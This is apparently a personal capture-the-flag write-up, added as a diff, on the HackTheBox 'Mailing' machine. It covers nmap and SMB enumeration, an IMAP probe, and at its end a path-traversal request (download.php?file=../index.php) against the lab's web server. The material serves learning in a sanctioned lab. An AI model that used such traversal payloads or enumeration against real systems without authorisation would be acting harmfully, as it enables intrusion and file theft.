@@ -1,0 +1,78 @@
+25/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+|_http-server-header: Microsoft-IIS/10.0
+110/tcp open  pop3          hMailServer pop3d
+|_pop3-capabilities: UIDL USER TOP
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp open  imap          hMailServer imapd
+|_imap-capabilities: NAMESPACE IMAP4 CAPABILITY CHILDREN ACL completed SORT OK IMAP4rev1 IDLE QUOTA RIGHTS=texkA0001
+445/tcp open  microsoft-ds?
+465/tcp open  ssl/smtp      hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+587/tcp open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+993/tcp open  ssl/imap      hMailServer imapd
+|_imap-capabilities: NAMESPACE IMAP4 CAPABILITY CHILDREN ACL completed SORT OK IMAP4rev1 IDLE QUOTA RIGHTS=texkA0001
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-05-23T01:28:41
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.02 seconds
+
+
+
+Oh no... email.  The bane of my existance... :(
+The nmap scan did leak the domain, mailing.htb -> added this to the hosts file.  
+The website looks like it has some instructions on how you can go about setting up a mail client to connect to their server.  Though it does also mention some employees: Gregory Smith, Maya Bendito (for this user, technically the instructions do mention a "maya@mailing.htb" account), Ruy Alonso
+For what it's worth, this does also appear to be a php site.
+
+Just taking a look at the other areas first, smb does not appear to host anything, at least without proper creds:
+
+crackmapexec smb 10.10.11.14 -u '' -p '' --shares
+SMB         10.10.11.14     445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
+SMB         10.10.11.14     445    MAILING          [-] MAILING\: STATUS_ACCESS_DENIED 
+SMB         10.10.11.14     445    MAILING          [-] Error enumerating shares: Error occurs while reading from remote(104)
+
+I dont think IMAP is super relevant here either, but I'm pretty inexpierenced when it comes to this...
+telnet mailing.htb 143
+Trying 10.10.11.14...
+Connected to mailing.htb.
+Escape character is '^]'.
+* OK IMAPrev1
+List Folders/Mailboxes
+List BAD Unknown or NULL command
+A1 LIST
+A1 NO Authenticate first
+A1 LIST "" *
+A1 NO Authenticate first
+
+I was going through the web server to get the instructions again, when I noticed the request is the below:
+GET /download.php?file=instructions.pdf HTTP/1.1
+
+I can pass this and return the correct page:
+GET /download.php?file=../index.php
